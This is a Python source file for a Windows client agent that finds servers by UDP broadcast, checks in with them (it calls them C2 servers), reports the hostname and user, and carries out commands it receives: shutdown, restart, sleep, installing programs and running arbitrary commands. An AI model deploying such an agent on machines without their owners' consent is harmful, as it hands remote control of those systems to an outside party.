
import requests
import time
import subprocess
import socket
import os
import json
from discovery import ServerListener

# --- CONFIGURATION ---
# The C2 server now uses HTTPS
# C2_SERVER_URL = "http://localhost:5000" # <<< CHANGE THIS
CHECKIN_INTERVAL = 60 # seconds
AGENT_ID_FILE = "agent_id.txt"

# ---------------------

def get_agent_id():
    """Retrieves the agent ID from a local file, or returns None if not found."""
    if os.path.exists(AGENT_ID_FILE):
        with open(AGENT_ID_FILE, 'r') as f:
            return f.read().strip()
    return None

def save_agent_id(agent_id):
    """Saves the agent ID to a local file."""
    with open(AGENT_ID_FILE, 'w') as f:
        f.write(agent_id)

import json

def execute_command(command_str):
    """Executes a command received from the C2 server."""
    if command_str == "none":
        return

    print(f"Executing command: {command_str}")
    try:
        command = json.loads(command_str)
        action = command.get('action')

        if action == "shutdown":
            subprocess.run(["shutdown", "/s", "/t", "1"], check=True)
        elif action == "restart":
            subprocess.run(["shutdown", "/r", "/t", "1"], check=True)
        elif action == "sleep":
            subprocess.run(["rundll32.exe", "powrprof.dll,SetSuspendState", "0,1,0"], check=True)
        elif action == "install":
            path = command.get('path')
            args = command.get('args', '')
            if path:
                # Ensure args is a list for subprocess.run
                command_list = [path] + args.split()
                subprocess.run(command_list, check=True)
            else:
                print("Install command received without a path.")
        elif action == "execute":
            cmd = command.get('cmd')
            args = command.get('args', '')
            if cmd:
                command_list = [cmd] + args.split()
                subprocess.run(command_list, check=True)
            else:
                print("Execute command received without a command.")

    except json.JSONDecodeError:
        print(f"Failed to decode command: {command_str}")
    except Exception as e:
        print(f"Failed to execute command '{command_str}': {e}")

def check_in(c2_server_url):
    """The main check-in loop for the agent."""
    agent_id = get_agent_id()
    hostname = socket.gethostname()
    current_user = os.getlogin()
    payload = {
        "agent_id": agent_id,
        "hostname": hostname,
        "current_user": current_user
    }

    try:
        response = requests.post(f"{c2_server_url}/agent/checkin", json=payload, timeout=10)
        print(f"Server response status code: {response.status_code}")
        print(f"Server response text: {response.text}")
        response.raise_for_status()
        
        try:
            data = response.json()
        except requests.exceptions.JSONDecodeError:
            print(f"Failed to decode JSON response from server. Response text: {response.text}")
            return False

        if not agent_id:
            new_agent_id = data.get('agent_id')
            if new_agent_id:
                save_agent_id(new_agent_id)
                print(f"Registered with C2 server. Agent ID: {new_agent_id}")
        
        execute_command(data.get('command'))
        return True # Indicate successful check-in

    except requests.exceptions.RequestException as e:
        print(f"Could not connect to C2 server: {e}")
        return False # Indicate failed check-in

def get_known_servers_from_c2(c2_server_url):
    """Fetches the list of known servers from a C2 server."""
    try:
        response = requests.get(f"{c2_server_url}/api/servers", timeout=5)
        response.raise_for_status()
        try:
            return response.json()
        except requests.exceptions.JSONDecodeError:
            print(f"Failed to decode JSON from server list. Response text: {response.text}")
            return []
    except requests.exceptions.RequestException as e:
        print(f"Error fetching known servers from {c2_server_url}: {e}")
        return []

if __name__ == "__main__":
    listener = ServerListener()
    listener.start()

    print("Starting Windows agent...")
    known_servers = {}
    try:
        while True:
            # Discover servers via UDP broadcast
            discovered_servers = listener.get_active_servers()
            for s in discovered_servers:
                server_key = f"{s['ip']}:{s['port']}"
                if server_key not in known_servers:
                    known_servers[server_key] = s
                    print(f"Discovered new server: {s['ip']}:{s['port']} (Role: {s['role']})")
            
            # Attempt to check in with known servers, prioritizing primary/secondary/tertiary
            # and updating our known_servers list from them
            connected_to_c2 = False
            sorted_servers = sorted(known_servers.values(), key=lambda x: (
                0 if x['role'] == 'primary' else
                1 if x['role'] == 'secondary' else
                2 if x['role'] == 'tertiary' else
                3 # client or unassigned
            ))

            for server_info in sorted_servers:
                c2_server_url = f"http://{server_info['ip']}:{server_info['port']}"
                print(f"Attempting to check in with {c2_server_url}...")
                if check_in(c2_server_url):
                    connected_to_c2 = True
                    # Fetch known servers from the connected C2 and merge
                    fetched_servers = get_known_servers_from_c2(c2_server_url)
                    for fs in fetched_servers:
                        fs_key = f"{fs['ip_address']}:{fs['port']}"
                        if fs_key not in known_servers:
                            known_servers[fs_key] = {'ip': fs['ip_address'], 'port': fs['port'], 'role': fs['role']}
                            print(f"Fetched new server: {fs['ip_address']}:{fs['port']} (Role: {fs['role']})")
                    break # Successfully checked in, move to next interval
            
            if not connected_to_c2:
                print("No C2 servers available for check-in. Retrying...")

            time.sleep(CHECKIN_INTERVAL)
    except KeyboardInterrupt:
        print("Agent stopped by user.")
    finally:
        listener.stop()
